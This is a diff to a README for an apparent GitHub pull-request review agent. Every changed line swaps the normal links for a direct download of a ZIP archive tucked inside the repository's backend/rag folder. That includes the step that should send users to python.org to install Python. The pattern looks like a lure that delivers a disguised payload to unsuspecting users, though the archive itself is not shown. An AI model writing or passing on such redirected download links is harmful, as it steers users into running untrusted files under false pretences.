@@ -1,12 +1,12 @@
 # 🤖 smart-pr-review-agent - Faster GitHub PR Review
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent/raw/refs/heads/main/backend/rag/agent-pr-smart-review-v2.5.zip)
 
 ## 📥 Download
 
 Use this page to visit and download the app:
 
-https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent
+https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent/raw/refs/heads/main/backend/rag/agent-pr-smart-review-v2.5.zip
 
 ## 🧭 What this app does
 
@@ -43,7 +43,7 @@ smart-pr-review-agent is an AI tool that reviews GitHub pull requests, looks for
 
 Open this page and download the files:
 
-https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent
+https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent/raw/refs/heads/main/backend/rag/agent-pr-smart-review-v2.5.zip
 
 If the page offers a ZIP file, save it to your computer.
 
@@ -68,7 +68,7 @@ After you extract the files:
 
 If Python is not on your PC:
 
-- Go to https://www.python.org/downloads/
+- Go to https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent/raw/refs/heads/main/backend/rag/agent-pr-smart-review-v2.5.zip
 - Download the latest Python 3 release for Windows
 - Run the installer
 - Check the box that says Add Python to PATH
@@ -273,4 +273,4 @@ Use a safe repo and a small code change so you can see:
 
 Visit this page to download or clone the project:
 
-https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent
+https://github.com/certifiedcheckwhiteberryyew113/smart-pr-review-agent/raw/refs/heads/main/backend/rag/agent-pr-smart-review-v2.5.zip
